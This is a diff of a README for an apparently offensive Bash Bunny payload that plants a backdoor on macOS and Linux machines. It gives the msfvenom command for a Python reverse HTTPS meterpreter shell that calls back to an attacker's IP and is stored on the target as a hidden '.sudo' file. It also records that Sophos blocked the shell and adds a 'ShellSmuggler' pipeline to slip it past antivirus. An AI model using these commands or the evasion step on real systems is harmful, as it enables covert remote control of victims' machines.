@@ -15,13 +15,15 @@ Cleaner: I will probably make a cleaner for this thing eventually for completene
 
 ## Configuration
 
-Inside the injector and the cleaner you can specify mac=true to switch the playload to macos mode.  I have not yet tested this, but will do so soon on a mac.  Works in linux.
+Inside the injector and the cleaner you can specify mac=true to switch the playload to macos mode.  This payload has been tested on mac and linux.  Works on both mac and linux.  Mac was running sophos antivirus during the test and it blocked download of the reverse tcp shell.  This can be fixed with the use of my shell smuggler (see below for details).
 
-## Crafting a meterpreter shell payload
+##Crafting a meterpreter shell payload
 
 Payloads should be crafted in msfvenom.  The meterpreter shell will be the python reverse https meterpreter payload.  The payload should be stored in the folder with the rest of the files for this bash bunny payload in a file called shell.py (stored on the target system as .sudo in the directory we created).  The command for generating an appropriate meterpreter shell payload is below:
-
 ```msfvenom -p python/meterpreter/reverse_https LHOST=<IP ADDRESS> LPORT=<PORT> -f raw > payload.py```
+
+Note that *antivirus appears to pick up this reverse tcp payload* really well. Annoying. shellSmuggler.py to the rescue!  The best way to run this is to cd into the bashbunny itself and then into the payloads switch folder you are running from and run the following command (plugging in your IP address and port):
+```msfvenom -p python/meterpreter/reverse_https LHOST=<IP ADDRESS> LPORT=<PORT> -f raw | python ShellSmuggler.py > shell.py```
 
 ## STATUS  (Note that I used the same configuration as SudoBackdoor, but I am seeing different LED behaviors.  Will investigate this soon.)
 Injector 
